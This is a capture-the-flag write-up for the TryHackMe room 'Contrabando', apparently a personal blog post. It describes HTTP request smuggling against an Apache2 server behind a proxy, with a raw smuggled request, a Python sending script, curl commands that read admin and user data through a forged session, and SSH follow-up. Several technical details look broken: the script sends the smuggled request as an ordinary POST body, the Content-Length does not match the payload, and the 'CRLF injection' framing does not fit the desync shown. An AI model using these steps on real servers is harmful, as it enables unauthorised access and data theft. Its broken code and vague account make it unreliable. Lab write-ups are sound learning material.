---
title: "TryHackMe: Contrabando"
date: 2025-08-18
description: "Contrabando began with exploiting an HTTP Request Smuggling vulnerability via CRLF injection in Apache2 to bypass authentication and access restricted areas."
categories: ["TryHackMe"]
tags: ["web", "http-smuggling", "crlf-injection", "apache", "bypass"]
image: "/images/writeups/contrabando-thumb.jpg"
difficulty: "Hard"
platform: "TryHackMe"
author: "Adithya Kallaje"
---

# TryHackMe: Contrabando Writeup

![Contrabando Banner](/images/writeups/contrabando-banner.jpg)

## Overview

Contrabando is a hard-difficulty room that focuses on HTTP Request Smuggling attacks using CRLF injection techniques to bypass authentication mechanisms in Apache2.

## Reconnaissance

### Initial Scanning
```bash
nmap -sC -sV -A 10.10.x.x
```

**Services Discovered:**
- 22/tcp - SSH
- 80/tcp - Apache2 HTTP Server
- 443/tcp - HTTPS

### Web Application Analysis

The target runs a web application with:
- Authentication portal
- Restricted administrative areas
- Load balancer configuration

## HTTP Request Smuggling

### Understanding the Architecture

The application uses a reverse proxy setup:
- Frontend: Load balancer
- Backend: Apache2 server

This configuration is susceptible to HTTP Request Smuggling attacks.

### CRLF Injection Discovery

```http
POST /login HTTP/1.1
Host: 10.10.x.x
Content-Length: 56
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: 10.10.x.x

```

### Exploitation Process

1. **Identify desync vulnerability**
2. **Craft malicious request**
3. **Bypass authentication**
4. **Access restricted areas**

```python
import requests

# Crafted request for smuggling
payload = """POST /login HTTP/1.1\r
Host: target.com\r
Content-Length: 56\r
Transfer-Encoding: chunked\r
\r
0\r
\r
GET /admin HTTP/1.1\r
Host: target.com\r
\r
"""

response = requests.post("http://10.10.x.x", data=payload)
```

## Authentication Bypass

### Smuggled Request Analysis

The smuggled request successfully bypassed:
- Session validation
- Access controls
- Authentication middleware

### Administrative Access

Once authenticated bypass was achieved:
```bash
# Access admin panel
curl -H "Cookie: session=smuggled_session" http://10.10.x.x/admin

# Extract sensitive data
curl -H "Cookie: session=smuggled_session" http://10.10.x.x/admin/users
```

## Post-Exploitation

### File System Access
- Configuration files
- User credentials
- Application secrets

### Privilege Escalation
```bash
# SSH access with discovered credentials
ssh admin@10.10.x.x

# Check privileges
sudo -l
```

## Impact Assessment

- **Authentication Bypass**: Complete
- **Data Exposure**: User credentials, application data
- **System Access**: SSH access gained
- **Privilege Level**: Administrative access

## Lessons Learned

- **HTTP Smuggling**: Critical vulnerability in proxy setups
- **CRLF Injection**: Powerful technique for request manipulation
- **Defense**: Proper proxy configuration is essential

## Mitigation Strategies

1. **Normalize HTTP requests**
2. **Use consistent parsing**
3. **Validate Content-Length**
4. **Implement strict HTTP parsing**

## Tools Used

- Burp Suite Professional
- Custom Python scripts
- HTTP Smuggling detection tools
- Nmap

---

**Difficulty**: Hard  
**Platform**: TryHackMe  
**Completion Date**: August 18, 2025
